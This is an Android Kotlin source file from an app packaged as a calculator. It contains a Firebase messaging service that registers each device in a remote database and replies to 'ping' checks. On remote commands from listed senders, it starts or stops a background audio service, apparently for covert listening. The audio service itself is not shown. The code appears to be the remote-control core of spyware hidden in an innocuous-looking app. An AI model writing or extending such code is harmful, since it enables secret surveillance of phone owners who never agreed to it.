package com.dp.calculator

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.*

class FCMService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FCMService"
        private const val ACTION_START = "START_AUDIO"
        private const val ACTION_STOP = "STOP_AUDIO"
        private const val ACTION_PING = "PING"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token: $token")

        // Register token with Firebase
        serviceScope.launch {
            registerToken(token)
        }
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)

        Log.d(TAG, "Message received: ${message.data}")

        // Check if message contains a data payload
        if (message.data.isNotEmpty()) {
            val action = message.data["action"] ?: return
            val senderId = message.data["senderId"] ?: return
            val timestamp = message.data["timestamp"]?.toLongOrNull() ?: System.currentTimeMillis()

            // Verify sender is authorized
            verifySender(senderId) { isAuthorized ->
                if (isAuthorized) {
                    handleCommand(action)
                } else {
                    Log.w(TAG, "Unauthorized sender: $senderId")
                }
            }
        }
    }

    private fun handleCommand(action: String) {
        when (action) {
            ACTION_START -> {
                Log.d(TAG, "Starting audio service")
                startAudioService()
            }
            ACTION_STOP -> {
                Log.d(TAG, "Stopping audio service")
                stopAudioService()
            }
            ACTION_PING -> {
                Log.d(TAG, "Ping received")
                sendPong()
            }
        }
    }

    private fun startAudioService() {
        val serviceIntent = Intent(this, AudioService::class.java).apply {
            action = AudioService.ACTION_START
        }
        startForegroundService(serviceIntent)
    }

    private fun stopAudioService() {
        val serviceIntent = Intent(this, AudioService::class.java).apply {
            action = AudioService.ACTION_STOP
        }
        startService(serviceIntent)
    }

    private fun sendPong() {
        // Send pong response to Firebase
        val deviceId = DeviceRegistrar.getDeviceId(this)
        val pongData = hashMapOf(
            "deviceId" to deviceId,
            "status" to "online",
            "timestamp" to System.currentTimeMillis()
        )

        com.google.firebase.firestore.FirebaseFirestore.getInstance()
            .collection("devices")
            .document(deviceId)
            .update(pongData as Map<String, Any>)
    }

    private fun verifySender(senderId: String, callback: (Boolean) -> Unit) {
        // Check if sender is in authorized list
        com.google.firebase.firestore.FirebaseFirestore.getInstance()
            .collection("authorized_users")
            .document(senderId)
            .get()
            .addOnSuccessListener { document ->
                callback(document.exists())
            }
            .addOnFailureListener {
                callback(false)
            }
    }

    private fun registerToken(token: String) {
        val deviceId = DeviceRegistrar.getDeviceId(this)

        val tokenData = hashMapOf(
            "deviceId" to deviceId,
            "fcmToken" to token,
            "timestamp" to System.currentTimeMillis(),
            "status" to "active"
        )

        com.google.firebase.firestore.FirebaseFirestore.getInstance()
            .collection("device_tokens")
            .document(deviceId)
            .set(tokenData)
    }

    override fun onDestroy() {
        serviceScope.cancel()
        super.onDestroy()
    }
}
